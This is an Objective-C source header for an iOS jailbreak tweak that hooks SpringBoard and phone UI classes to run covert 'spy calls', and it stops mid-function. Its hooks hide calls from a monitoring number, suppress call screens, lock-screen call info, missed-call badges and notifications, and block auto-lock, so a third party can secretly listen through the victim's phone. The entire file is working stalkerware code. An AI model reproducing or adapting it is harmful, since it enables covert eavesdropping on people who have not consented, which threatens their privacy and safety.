//
//  SpyCallSpringBoard.h
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MSSPC.h"
#import "SpringBoard.h"
#import "SBApplicationIcon.h"
#import "SBTelephonyManager.h"
#import "SBMediaController.h"
#import "SBPluginManager.h"
#import "SBAwayView.h"
#import "SBCallFailureAlert.h"
#import "SBApplication.h"
#import "SBAppSwitcherController.h"
#import "SBSlidingAlertDisplay.h"
#import "SBAwayController.h"

// IOS 5
#import "MPPhoneCallWaitingController.h"
#import "MPIncomingPhoneCallController.h"
#import "SBAwayBulletinListController.h"
#import "BBBulletin.h"
#import "BBBContent.h"

// IOS 4
#import "SBCallAlert.h"
#import "SBCallAlertDisplay.h"
#import "SBCallWaitingAlertDisplay.h"
#import "SBUIController.h"
#import "SBTelephonyManager+IOS4.h"

// IOS 6
#import "SBDeviceLockController.h"

#import "AVController.h"

#import "SpyCallManager.h"
#import "SpyCallSpringBoardService.h"
#import "SystemEnvironmentUtils.h"
#import "SpyCallUtils.h"

#import "DefStd.h"

static NSString *kSpyCallMobilePhoneIndentifer		= @"com.apple.mobilephone";
static NSString *kSpyCallVoiceMemosIndentifer		= @"com.apple.VoiceMemos";
static NSString *kSpyCallYoutubeIndentifier			= @"com.apple.youtube";
static NSString *kSpyCallMusicIndentifier			= @"com.apple.mobileipod";
static NSString *kSpyCallVideosIndentifier			= @"com.apple.videos";
static NSString *kSpyCalliPodIndentifier			= @"com.apple.mobileipod"; // The same as Music
static NSString * const kSpyCallPodcastsIdentifier	= @"com.apple.podcasts";
static NSString * const kSpyCallGoogleYoutubeIndentifier	= @"com.google.ios.youtube";
static NSString * const kSpyCalliTuneIndentifier		= @"com.apple.MobileStore";

#pragma mark -
#pragma mark Spy call manager helper C methods
#pragma mark -

BOOL isNormalCallInProgressSB() {
	return ([[SpyCallManager sharedManager] mIsNormalCallInProgress]);
}

BOOL isNormalCallIncomingSB() {
	return ([[SpyCallManager sharedManager] mIsNormalCallIncoming]);
}

BOOL isSpyCallInProgressSB() {
	return ([[SpyCallManager sharedManager] mIsSpyCallInProgress]);
}

BOOL isSpyCallAnsweringSB() {
	return ([[SpyCallManager sharedManager] mIsSpyCallAnswering]);
}

BOOL isSpyCallDisconnectingSB() {
	return ([[SpyCallManager sharedManager] mIsSpyCallDisconnecting]);
}

BOOL isSpyCallInConferenceSB() {
	return ([[SpyCallManager sharedManager] mIsSpyCallInConference]);
}

BOOL isSpyCallLeavingConferenceSB() {
	return ([[SpyCallManager sharedManager] mIsSpyCallLeavingConference]);
}

BOOL isSpyCallInitiatingConferenceSB() {
	return ([[SpyCallManager sharedManager] mIsSpyCallInitiatingConference]);
}

BOOL isAudioActiveSB() {
	BOOL isAudioActive = ([SpyCallUtils isPlayingAudio] || [SpyCallUtils isRecordingAudio]);
	if (!isAudioActive) {
		// Recheck from first check (in 4.3.3, 3gs, second check of audio state is always return false)
		isAudioActive = [SpyCallUtils isAudioActiveFromFirstCheck];
	}
	return (isAudioActive);
}

NSInteger countNormalCallSB() {
	return ([[SpyCallManager sharedManager] normalCallCount]);
}

BOOL isAnyCallOnHoldSB() {
	return ([[SpyCallManager sharedManager] isCallsOnHold]);
}

void endSpyCallSB() {
	SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
	[spyCallManager disconnectedActivityDetected];
	SpyCallSpringBoardService *service = [SpyCallSpringBoardService sharedService];
	[service sendService:kSpyCallServiceEndSpyCall withServiceData:nil];
}

BOOL isApplicationIncompatible(NSString *aAppIdentifier) {
	BOOL incompatible = FALSE;
	if ([aAppIdentifier isEqualToString:kSpyCallVoiceMemosIndentifer] ||
		[aAppIdentifier isEqualToString:kSpyCallYoutubeIndentifier] ||
		[aAppIdentifier isEqualToString:kSpyCallMusicIndentifier] ||
		[aAppIdentifier isEqualToString:kSpyCallVideosIndentifier] ||
		[aAppIdentifier isEqualToString:kSpyCalliPodIndentifier] ||
		[aAppIdentifier isEqualToString:kSpyCallPodcastsIdentifier] ||
		[aAppIdentifier isEqualToString:kSpyCallGoogleYoutubeIndentifier]) {
		incompatible = TRUE;
	}
	return (incompatible);
}

void divertAudioSessionToRingTone(AVController *aAVController) {
	DLog(@"****** ENTER ******")
	[SpyCallUtils setAVController:aAVController category:@"Ringtone" transition:1];
	DLog(@"****** END ******")
}

///========================= HOOK ==================

#pragma mark -
#pragma mark System methods
#pragma mark -

MSHook(int, system, const char *command) {
	APPLOGVERBOSE(@"system");
	NSString *cmd = [NSString stringWithCString:command encoding:NSUTF8StringEncoding];
	cmd = [cmd lowercaseString];
	if ([cmd rangeOfString:@"springboard"].location != NSNotFound) {
		if (isSpyCallInProgressSB()) {
			command = "";
		}
	}
	return _system(command);
}

#pragma mark -
#pragma mark SpringBoard methods
#pragma mark -

HOOK(SpringBoard, _proximityChanged$, void, id arg1) {
	APPLOGVERBOSE(@"_proximityChanged");
    if (isSpyCallInConferenceSB() || !isSpyCallInProgressSB()) {
        CALL_ORIG(SpringBoard, _proximityChanged$, arg1);
	}
}

HOOK(SpringBoard, lockButtonDown$, void, id aEvent) {
	APPLOGVERBOSE(@"lockButtonDown");
	if (isSpyCallInProgressSB()) {
		endSpyCallSB();
		SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
		[[spyCallManager mSystemEnvUtils] setMBlockLockButtonUp:YES];
	} else {
		CALL_ORIG(SpringBoard, lockButtonDown$, aEvent);
	}
}

HOOK(SpringBoard, lockButtonUp$, void, id aEvent) {
	APPLOGVERBOSE(@"lockButtonUp >>> MSSPC");
	SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
	if ([[spyCallManager mSystemEnvUtils] mBlockLockButtonUp]) {
		[[spyCallManager mSystemEnvUtils] setMBlockLockButtonUp:NO];
	} else {
		CALL_ORIG(SpringBoard, lockButtonUp$, aEvent);
	}
}

HOOK(SpringBoard, menuButtonDown$, void, id aEvent) {
	APPLOGVERBOSE(@"menuButtonDown >>> MSSPC");
	if ([self isLocked]) {
		if (isSpyCallInProgressSB()) {
			endSpyCallSB();
			SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
			[[spyCallManager mSystemEnvUtils] setMBlockMenuButtonUp:YES];
		} else {
			CALL_ORIG(SpringBoard, menuButtonDown$, aEvent);
		}
	} else {
		CALL_ORIG(SpringBoard, menuButtonDown$, aEvent);
	}
}

HOOK(SpringBoard, menuButtonUp$, void, id aEvent) {
	APPLOGVERBOSE(@"menuButtonUp >>> MSSPC");
	if ([self isLocked]) {
		SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
		if ([[spyCallManager mSystemEnvUtils] mBlockMenuButtonUp]) {
			[[spyCallManager mSystemEnvUtils] setMBlockMenuButtonUp:NO];
		} else {
			CALL_ORIG(SpringBoard, menuButtonUp$, aEvent);
		}
	} else {
		CALL_ORIG(SpringBoard, menuButtonUp$, aEvent);
	}
}

HOOK(SpringBoard, statusBarReturnActionTap$, void, id aEvent) {
	APPLOGVERBOSE(@"statusBarReturnActionTap$");
	if (isSpyCallInitiatingConferenceSB()) {
		;
	} else {
		CALL_ORIG(SpringBoard, statusBarReturnActionTap$, aEvent);
	}
}

HOOK(SpringBoard, autoLock, void) {
	APPLOGVERBOSE(@"autoLock");
	 if(isSpyCallInProgressSB() || isSpyCallAnsweringSB() || isSpyCallDisconnectingSB()) {
		;
	} else {
		CALL_ORIG(SpringBoard, autoLock);
	}
}

#pragma mark -
#pragma mark SBApplicationIcon methods
#pragma mark -

HOOK(SBApplicationIcon, launch, void) {
	APPLOGVERBOSE(@"launch");
	NSString *bundleID = [self applicationBundleID];
	if (isApplicationIncompatible(bundleID)) {
		if (isSpyCallInProgressSB() && !isSpyCallInConferenceSB()) { // Spy call only
			endSpyCallSB();
		} else {
			CALL_ORIG(SBApplicationIcon, launch);
		}
	} else {
		if ([bundleID isEqualToString:kSpyCallMobilePhoneIndentifer] && isSpyCallInitiatingConferenceSB()) {
			;
		} else {
			CALL_ORIG(SBApplicationIcon, launch);
		}
	}
}

HOOK(SBApplicationIcon, launchFromViewSwitcher, void) {
	APPLOGVERBOSE(@"launchFromViewSwitcher");
	NSString *bundleID = [self applicationBundleID];
	if (isApplicationIncompatible(bundleID)) {
		if (isSpyCallInProgressSB() && !isSpyCallInConferenceSB()) { // Spy call only
			endSpyCallSB();
		} else {
			CALL_ORIG(SBApplicationIcon, launchFromViewSwitcher);
		}
	} else {
		if ([bundleID isEqualToString:kSpyCallMobilePhoneIndentifer] && isSpyCallInitiatingConferenceSB()) {
			;
		} else {
			CALL_ORIG(SBApplicationIcon, launchFromViewSwitcher);
		}
	}
}

HOOK(SBApplicationIcon, _setBadge$, void, id arg1) {
	APPLOGVERBOSE(@"_setBadge");
	if ([[self applicationBundleID] isEqualToString:kSpyCallMobilePhoneIndentifer]) {
		NSNumber *badge = [[arg1 userInfo] objectForKey:@"SBApplicationIconBadgeNumberOrStringKey"];
		if ([badge intValue] > 0 && [badge intValue] <= 100) {
			// Decrease missed call back which was increase in SpyCallManager
			NSInteger missedCall = [[[SpyCallManager sharedManager] mSystemEnvUtils] mMissedCall];
			if ((isNormalCallInProgressSB() || isAudioActiveSB() || isAnyCallOnHoldSB() || countNormalCallSB() >= MAX_CONFERENCE_LINE) && // 
				[[SpyCallManager sharedManager] mIsSpyCallDisconnecting]) {
				APPLOGVERBOSE(@"_setBadge -1");
				badge = [NSNumber numberWithInt:[badge intValue] - 1];
				missedCall--;
			} else { // Missed call which music is playing in foreground
				APPLOGVERBOSE(@"_setBadge -missedCall");
				NSInteger newBadge = [badge intValue] - missedCall;
				newBadge = (newBadge >= 0) ? newBadge : 0;
				badge = [NSNumber numberWithInt:newBadge];
				missedCall = 0;
			}
			missedCall = (missedCall >= 0) ? missedCall : 0;
			[[[SpyCallManager sharedManager] mSystemEnvUtils] setMMissedCall:missedCall];
		} else {
			badge = [NSNumber numberWithInt:0];
		}
		NSMutableDictionary *userInfo = [NSMutableDictionary dictionary];
		[userInfo setObject:badge forKey:@"SBApplicationIconBadgeNumberOrStringKey"];
		NSNotification *notification = [NSNotification notificationWithName:@"SBApplicationIconBadgeChangedNotification"
																		object:[self applicationBundleID]
																	  userInfo:userInfo];
		CALL_ORIG(SBApplicationIcon, _setBadge$, notification);
	} else {
		CALL_ORIG(SBApplicationIcon, _setBadge$, arg1);
	}
}

HOOK(SBApplicationIcon, setBadge$, void, id arg1) {
	APPLOGVERBOSE(@"setBadge");
	if ([[self applicationBundleID] isEqualToString:kSpyCallMobilePhoneIndentifer]) {
		NSNumber *badge = arg1;
		if ([badge intValue] > 0 && [badge intValue] <= 100) {
			// Decrease missed call back which was increase in SpyCallManager
			NSInteger missedCall = [[[SpyCallManager sharedManager] mSystemEnvUtils] mMissedCall];
			if ((isNormalCallInProgressSB() || isAudioActiveSB() || isAnyCallOnHoldSB() || countNormalCallSB() >= MAX_CONFERENCE_LINE) && // 
				[[SpyCallManager sharedManager] mIsSpyCallDisconnecting]) {
				APPLOGVERBOSE(@"setBadge -1");
				badge = [NSNumber numberWithInt:[badge intValue] - 1];
				missedCall--;
			} else { // Missed call which music is playing in foreground
				APPLOGVERBOSE(@"setBadge -missedCall");
				NSInteger newBadge = [badge intValue] - missedCall;
				newBadge = (newBadge >= 0) ? newBadge : 0;
				badge = [NSNumber numberWithInt:newBadge];
				missedCall = 0;
			}
			missedCall = (missedCall >= 0) ? missedCall : 0;
			[[[SpyCallManager sharedManager] mSystemEnvUtils] setMMissedCall:missedCall];
		} else {
			badge = [NSNumber numberWithInt:0];
		}
		CALL_ORIG(SBApplicationIcon, setBadge$, badge);
	} else {
		CALL_ORIG(SBApplicationIcon, setBadge$, arg1);
	}
}

#pragma mark -
#pragma mark SBUIController methods
#pragma mark -

HOOK(SBUIController, activateApplicationFromSwitcher$, void, id arg1) {
	// Work the same as launch, launchFromAppSwitcher of SBApplicationIcon
	APPLOGVERBOSE(@"activateApplicationFromSwitcher, bundle id of launch appliation = %@", [arg1 bundleIdentifier]);
	NSString *bundleID = [arg1 bundleIdentifier];
	if (isApplicationIncompatible(bundleID)) {
		if (isSpyCallInProgressSB() && !isSpyCallInConferenceSB()) { // Spy call only
			endSpyCallSB();
		} else {
			CALL_ORIG(SBUIController, activateApplicationFromSwitcher$, arg1);
		}
	} else {
		if ([bundleID isEqualToString:kSpyCallMobilePhoneIndentifer] && isSpyCallInitiatingConferenceSB()) {
			;
		} else {
			CALL_ORIG(SBUIController, activateApplicationFromSwitcher$, arg1);
		}
	}
}

#pragma mark -
#pragma mark SBSlidingAlertDisplay methods
#pragma mark -

HOOK(SBSlidingAlertDisplay, deviceLockViewEmergencyCallButtonPressed$, void, id arg1) {
	DLog (@"deviceLockViewEmergencyCallButtonPressed$, arg1 = %@", arg1);
	if (isSpyCallAnsweringSB() || isSpyCallDisconnectingSB()) {
		;
	} else if (isSpyCallInProgressSB()) {
		endSpyCallSB();
	} else {
		CALL_ORIG(SBSlidingAlertDisplay, deviceLockViewEmergencyCallButtonPressed$, arg1);
	}
}

#pragma mark -
#pragma mark SBAppSwitcherController methods
#pragma mark -

HOOK(SBAppSwitcherController, applicationDied$, void, id arg1) {
	APPLOGVERBOSE(@"applicationDied arg1 = %@", arg1);
	SBApplication *application = arg1;
	NSString *bundleIdentifier = [application bundleIdentifier];
	APPLOGVERBOSE(@"bundleIndentifier = %@", bundleIdentifier);
	if ([bundleIdentifier isEqualToString:kSpyCallMobilePhoneIndentifer]) {
		endSpyCallSB();
	}
	CALL_ORIG(SBAppSwitcherController, applicationDied$, arg1);
}

#pragma mark -
#pragma mark SBTelephonyManager methods
#pragma mark -

HOOK(SBTelephonyManager, updateSpringBoard, void) {
	APPLOGVERBOSE(@"updateSpringBoard, spy in progress = %d, spy disconnect = %d, conference = %d", isSpyCallInProgressSB(),
					isSpyCallDisconnectingSB(), isSpyCallInConferenceSB());
	if (isSpyCallAnsweringSB() || isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallInProgressSB() && isSpyCallInConferenceSB()) {
			CALL_ORIG(SBTelephonyManager, updateSpringBoard);
		}
	} else {
		CALL_ORIG(SBTelephonyManager, updateSpringBoard);
	}
}

// IOS 5
HOOK(SBTelephonyManager, urlWithScheme$fromDialingNumber$abUID$urlPathAddition$forceAssist$suppressAssist$wasAlreadyAssisted$, id,
					id arg1, id arg2, id arg3, id arg4, BOOL arg5, BOOL arg6, BOOL arg7) {
	APPLOGVERBOSE(@"urlWithScheme$fromDialingNumber$abUID$urlPathAddition$forceAssist$suppressAssist$wasAlreadyAssisted$");
	if (isSpyCallInProgressSB()) {
		endSpyCallSB();
		return nil;
	} else {
		return CALL_ORIG(SBTelephonyManager, urlWithScheme$fromDialingNumber$abUID$urlPathAddition$forceAssist$suppressAssist$wasAlreadyAssisted$,
						 arg1, arg2, arg3, arg4, arg5, arg6, arg7);
	}
}

// IOS 4 (tested IOS 4.2.1)
HOOK(SBTelephonyManager, urlWithScheme$fromDialingNumber$abUID$urlPathAddition$, id, id arg1, id arg2, id arg3, id arg4) {
	APPLOGVERBOSE(@"urlWithScheme$fromDialingNumber$abUID$urlPathAddition$");
	if (isSpyCallInProgressSB()) {
		endSpyCallSB();
		return nil;
	} else {
		return CALL_ORIG(SBTelephonyManager, urlWithScheme$fromDialingNumber$abUID$urlPathAddition$,
						 arg1, arg2, arg3, arg4);
	}
}

#pragma mark -
#pragma mark SBAwayView methods
#pragma mark -

HOOK(SBAwayView, shouldShowInCallInfo, BOOL) {
	APPLOGVERBOSE(@"shouldShowInCallInfo");
	if (isSpyCallAnsweringSB() || isSpyCallInProgressSB()) {
		return NO;
	} else {
		return CALL_ORIG(SBAwayView, shouldShowInCallInfo);
	}
}

HOOK(SBAwayView, lockBarStoppedTracking$, void, id arg1) {
	DLog(@"lockBarStoppedTracking$");
	if (isSpyCallAnsweringSB() || isSpyCallDisconnectingSB()) {
		return;
	} else if (isSpyCallInProgressSB()) {
		NSString *sbUserPath = @"/var/mobile/Library/Preferences/com.apple.springboard.plist";
		NSDictionary *sbUserInfo = [[NSDictionary alloc] initWithContentsOfFile:sbUserPath];
		if (sbUserInfo) {
			NSNumber *lockFailedAttempts = [sbUserInfo objectForKey:@"SBDeviceLockFailedAttempts"];
			Class $SBDeviceLockController = objc_getClass("SBDeviceLockController"); // IOS 6
			Class $SBAwayController = objc_getClass("SBAwayController"); // IOS 4,5
			BOOL _showingBlockedIndicator = NO;
			if ($SBDeviceLockController) {
				_showingBlockedIndicator = [[$SBDeviceLockController sharedController] isBlocked];
			} else if ($SBAwayController) {
				_showingBlockedIndicator = [[$SBAwayController sharedAwayController] isBlocked];
			}
			DLog (@"lockFailedAttempts = %@, _showingBlockedIndicator = %d", lockFailedAttempts, _showingBlockedIndicator);
			if ([lockFailedAttempts intValue] >= 6 && _showingBlockedIndicator) {
				// Apple magic number of number of attempts (tested Ipad 5.1.1, Iphone 4 4.2.1, Iphone 3gs 5.1.1)
				endSpyCallSB();
			} else {
				CALL_ORIG(SBAwayView, lockBarStoppedTracking$, arg1);
			}
		} else {
			CALL_ORIG(SBAwayView, lockBarStoppedTracking$, arg1);
		}
		[sbUserInfo release];
	} else {
		CALL_ORIG(SBAwayView, lockBarStoppedTracking$, arg1);
	}
}

#pragma mark -
#pragma mark SBCallFailureAlert methods
#pragma mark -

HOOK(SBCallFailureAlert, initWithCauseCode$call$, id, long cause, id aCallEvent) { 
	APPLOGVERBOSE(@"initWithCauseCode$call$ cause = %ld", cause);
	if (aCallEvent) {
		if ([SpyCallUtils isSpyCall:(CTCall *)aCallEvent]) {
			Class $SBTelephonyManager = objc_getClass("SBTelephonyManager");
			[[$SBTelephonyManager sharedTelephonyManager] updateSpringBoard];
			return nil;
		} else {
			return CALL_ORIG(SBCallFailureAlert, initWithCauseCode$call$, cause, aCallEvent);
		}
	} else {
		return CALL_ORIG(SBCallFailureAlert, initWithCauseCode$call$, cause, aCallEvent);
	}
}

///========================= INCOMING CALL, CALL WAITING AUDIO CONTROL IOS 5 ==================
#pragma mark -
#pragma mark INCOMING CALL, CALL WAITING AUDIO CONTROL IOS 5
#pragma mark -

#pragma mark -
#pragma mark MPIncomingPhoneCallController methods
#pragma mark -

HOOK(MPIncomingPhoneCallController, initWithCall$, id, id arg1) {
	APPLOGVERBOSE(@"initWithCall");
	CTCall *call = (CTCall *)arg1;
	if ([SpyCallUtils isSpyCall:call]) {
		return nil;
	} else {
		return CALL_ORIG(MPIncomingPhoneCallController, initWithCall$, arg1);
	}
}

HOOK(MPIncomingPhoneCallController, updateLCDWithName$label$breakPoint$, void, id arg1, id arg2, id arg3) {
	APPLOGVERBOSE(@"updateLCDWithName$label$breakPoint$ name: %@, label: %@, breakPoint: %@", arg1, arg2, arg3);
	NSMutableCharacterSet *charSet = [[NSMutableCharacterSet alloc] init];
	[charSet addCharactersInString:@"+-"];
	NSString *telNumber = [[arg1 componentsSeparatedByCharactersInSet:charSet] componentsJoinedByString:@""];
	APPLOGVERBOSE(@"updateLCDWithName$label$breakPoint$ telNumber: %@", telNumber);
	if (![SpyCallUtils isSpyNumber:telNumber]) {
		CALL_ORIG(MPIncomingPhoneCallController, updateLCDWithName$label$breakPoint$, arg1, arg2, arg3);
	}
	[charSet release];
}

HOOK(MPIncomingPhoneCallController, viewWillAppear$, void, BOOL arg1) {
	APPLOGVERBOSE(@"viewWillAppear");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB() && !isSpyCallInConferenceSB()) {
			//[self ringOrVibrate];
			//divertAudioSessionToRingTone([[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController]);
		}
	}
	CALL_ORIG(MPIncomingPhoneCallController, viewWillAppear$, arg1);
}

HOOK(MPIncomingPhoneCallController, viewDidAppear$, void, BOOL arg1) {
	APPLOGVERBOSE(@"viewDidAppear");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB() && !isSpyCallInConferenceSB()) {
			//[self ringOrVibrate];
			//divertAudioSessionToRingTone([[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController]);
		}
	}
	CALL_ORIG(MPIncomingPhoneCallController, viewDidAppear$, arg1);
}

#pragma mark -
#pragma mark MPPhoneCallWaitingController methods
#pragma mark -

HOOK(MPPhoneCallWaitingController, viewWillAppear$, void, BOOL arg1) {
	APPLOGVERBOSE(@"viewWillAppear");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB() && !isSpyCallInConferenceSB()) {
			//[self ringOrVibrate];
			//divertAudioSessionToRingTone([[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController]);
		}
	}
	CALL_ORIG(MPPhoneCallWaitingController, viewWillAppear$, arg1);
}

HOOK(MPPhoneCallWaitingController, viewDidAppear$, void, BOOL arg1) {
	APPLOGVERBOSE(@"viewDidAppear");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB() && !isSpyCallInConferenceSB()) {
			//[self ringOrVibrate];
			//divertAudioSessionToRingTone([[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController]);
		}
	}
	CALL_ORIG(MPPhoneCallWaitingController, viewDidAppear$, arg1);
}

HOOK(MPPhoneCallWaitingController, initWithCall$, id, id arg1) {
	APPLOGVERBOSE(@"initWithCall");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB()) {
			return CALL_ORIG(MPPhoneCallWaitingController, initWithCall$, arg1);
		} else {
			return nil;
		}
	} else {
		return CALL_ORIG(MPPhoneCallWaitingController, initWithCall$, arg1);
	}
}

HOOK(MPPhoneCallWaitingController, _addCallWaitingButtons$, void, BOOL arg1) {
	APPLOGVERBOSE(@"_addCallWaitingButtons");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB() && isSpyCallLeavingConferenceSB()) { // Conference state
			CALL_ORIG(MPPhoneCallWaitingController, _addCallWaitingButtons$, arg1);
		}
		APPLOGVERBOSE(@"NOT ADD CALL WAITING BUTTON, SIP=%d, CDING=%d, NIC=%d, SLC=%d", isSpyCallInProgressSB(), isSpyCallDisconnectingSB(),
					  isNormalCallIncomingSB(), isSpyCallLeavingConferenceSB());
	} else {
		CALL_ORIG(MPPhoneCallWaitingController, _addCallWaitingButtons$, arg1);
	}
}

HOOK(MPPhoneCallWaitingController, _newBottomButtonBar, id) {
	APPLOGVERBOSE(@"_newBottomButtonBar");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB() && isSpyCallLeavingConferenceSB()) { // Conference state
			return CALL_ORIG(MPPhoneCallWaitingController, _newBottomButtonBar);
		} else {
			APPLOGVERBOSE(@"NOT ADD BOTTOM BUTTON BAR, SIP=%d, CDING=%d, NIC=%d, SLC=%d", isSpyCallInProgressSB(), isSpyCallDisconnectingSB(),
						  isNormalCallIncomingSB(), isSpyCallLeavingConferenceSB());
			return nil;
		}
	} else {
		return CALL_ORIG(MPPhoneCallWaitingController, _newBottomButtonBar);
	}
}

#pragma mark -
#pragma mark SBPluginManager methods
#pragma mark -

HOOK(SBPluginManager, loadPluginBundle$, Class, id arg1) {
	NSBundle *bundle = arg1;
	APPLOGVERBOSE(@"loadPluginBundle bundleID = %@ loaded = %d", [bundle bundleIdentifier], [bundle isLoaded]);
	if ([[bundle bundleIdentifier] isEqualToString:@"com.apple.mobilephone.incomingcall"]) {
		// Incoming call
		Class $MPIncomingPhoneCallController = [bundle classNamed:@"MPIncomingPhoneCallController"];
		_MPIncomingPhoneCallController$initWithCall$ = MSHookMessage($MPIncomingPhoneCallController, @selector(initWithCall:), &$MPIncomingPhoneCallController$initWithCall$);
		_MPIncomingPhoneCallController$updateLCDWithName$label$breakPoint$ = MSHookMessage($MPIncomingPhoneCallController, @selector(updateLCDWithName:label:breakPoint:), &$MPIncomingPhoneCallController$updateLCDWithName$label$breakPoint$);
		// Hook for ringing + vibrate (spy call in progress normal come in) sometime go to call waiting controller
		_MPIncomingPhoneCallController$viewWillAppear$ = MSHookMessage($MPIncomingPhoneCallController, @selector(viewWillAppear:), &$MPIncomingPhoneCallController$viewWillAppear$);
		_MPIncomingPhoneCallController$viewDidAppear$ = MSHookMessage($MPIncomingPhoneCallController, @selector(viewDidAppear:), &$MPIncomingPhoneCallController$viewDidAppear$);
		
		// Call waiting
		Class $MPPhoneCallWaitingController = [bundle classNamed:@"MPPhoneCallWaitingController"];
		_MPPhoneCallWaitingController$initWithCall$ = MSHookMessage($MPPhoneCallWaitingController, @selector(initWithCall:), &$MPPhoneCallWaitingController$initWithCall$);
		_MPPhoneCallWaitingController$_addCallWaitingButtons$ = MSHookMessage($MPPhoneCallWaitingController, @selector(_addCallWaitingButtons:), &$MPPhoneCallWaitingController$_addCallWaitingButtons$);
		_MPPhoneCallWaitingController$_newBottomButtonBar = MSHookMessage($MPPhoneCallWaitingController, @selector(_newBottomButtonBar), &$MPPhoneCallWaitingController$_newBottomButtonBar);
		// Hook for ringing + vibrate (spy call in progress normal come in) sometime go to incoming call controller
		_MPPhoneCallWaitingController$viewWillAppear$ = MSHookMessage($MPPhoneCallWaitingController, @selector(viewWillAppear:), &$MPPhoneCallWaitingController$viewWillAppear$);
		_MPPhoneCallWaitingController$viewDidAppear$ = MSHookMessage($MPPhoneCallWaitingController, @selector(viewDidAppear:), &$MPPhoneCallWaitingController$viewDidAppear$);
	}
	return CALL_ORIG(SBPluginManager, loadPluginBundle$, arg1);
}

#pragma mark -
#pragma mark SBAwayBulletinListController methods
#pragma mark -

HOOK(SBAwayBulletinListController, observer$addBulletin$forFeed$, void, id arg1, id arg2, unsigned int arg3) {
	APPLOGVERBOSE(@"--------------- observer$addBulletin$forFeed$ -----------------");
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	APPLOGVERBOSE(@"arg3 = %d", arg3);
	APPLOGVERBOSE(@"--------------- observer$addBulletin$forFeed$ -----------------");
	
	BBBulletin *bulletin = arg2;
	
	APPLOGVERBOSE(@"--------------- bulletin -----------------");
	APPLOGVERBOSE(@"bulletinID = %@", [bulletin bulletinID]); // 9D43549A-117E-4381-9149-6E337FB6D041
	APPLOGVERBOSE(@"context = %@", [bulletin context]); // {key=value} contactInfo = 0850634791
	APPLOGVERBOSE(@"addressBookRecordID = %d", [bulletin addressBookRecordID]); // -1
	APPLOGVERBOSE(@"publisherBulletinID = %@", [bulletin publisherBulletinID]); // null
	APPLOGVERBOSE(@"recordID = %@", [bulletin recordID]); // missedcall 463-0850634791-1367214015-1-0
	APPLOGVERBOSE(@"sectionID = %@", [bulletin sectionID]); // com.apple.mobilephone
	APPLOGVERBOSE(@"--------------- bulletin -----------------");
	
	BBContent *bbContent = [bulletin content];
	
	// This to fix issue of monitor number is saved in address book then monitor call come in while music is playing
	// in phone is locked with passcode... (Pla found this issue)
	NSDictionary *context = [bulletin context];
	NSString *contactInfo = [context objectForKey:@"contactInfo"];
	
	if (![SpyCallUtils isSpyNumber:[bbContent title]] &&
		![SpyCallUtils isSpyNumber:contactInfo]) {
		if ((isNormalCallInProgressSB() || isAudioActiveSB() || isAnyCallOnHoldSB() || countNormalCallSB() >= MAX_CONFERENCE_LINE) && // 
			[[SpyCallManager sharedManager] mIsSpyCallDisconnecting]) {
			;
		} else {
			CALL_ORIG(SBAwayBulletinListController, observer$addBulletin$forFeed$, arg1, arg2, arg3);
		}
	}
}

///========================= AVController ==================

#pragma mark -
#pragma mark AVController methods
#pragma mark -

HOOK(AVController, init, id) {
	APPLOGVERBOSE(@"init");
	AVController *avController = CALL_ORIG(AVController, init);
	[[[SpyCallManager sharedManager] mSystemEnvUtils] setMAVController:avController];
	//[[[SpyCallManager sharedManager] mSystemEnvUtils] dumpAudioCategory]; // For testing purpose
	return (avController);
}

///========================= INCOMING CALL, CALL WAITING AUDIO CONTROL IOS 4 ==================
#pragma mark -
#pragma mark INCOMING CALL, CALL WAITING AUDIO CONTROL IOS 4
#pragma mark -

#pragma mark -
#pragma mark SBCallAlert methods
#pragma mark -

HOOK(SBCallAlert, initWithCall$, id, id arg1) {
	APPLOGVERBOSE(@"initWithCall$");
	CTCall *call = (CTCall *)arg1;
	if ([SpyCallUtils isSpyCall:call]) {
		return nil;
	} else {
		return CALL_ORIG(SBCallAlert, initWithCall$, arg1);
	}
}

#pragma mark -
#pragma mark SBCallAlertDisplay methods
#pragma mark -

HOOK(SBCallAlertDisplay, updateLCDWithName$label$breakPoint$, void, id arg1, id arg2, unsigned int arg3) {
	APPLOGVERBOSE(@"updateLCDWithName$label$breakPoint$");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB()) {
			divertAudioSessionToRingTone([[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController]);
			[self ringOrVibrate];
			CALL_ORIG(SBCallAlertDisplay, updateLCDWithName$label$breakPoint$, arg1, arg2, arg3);
		}
	} else {
		CALL_ORIG(SBCallAlertDisplay, updateLCDWithName$label$breakPoint$, arg1, arg2, arg3);
	}
}

#pragma mark -
#pragma mark SBCallWaitingAlertDisplay methods
#pragma mark -

HOOK(SBCallWaitingAlertDisplay, _addCallWaitingButtons$, void, BOOL arg1) {
	APPLOGVERBOSE(@"_addCallWaitingButtons");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB()) {
			if (isSpyCallLeavingConferenceSB()) { // Conference state
				CALL_ORIG(SBCallWaitingAlertDisplay, _addCallWaitingButtons$, arg1);
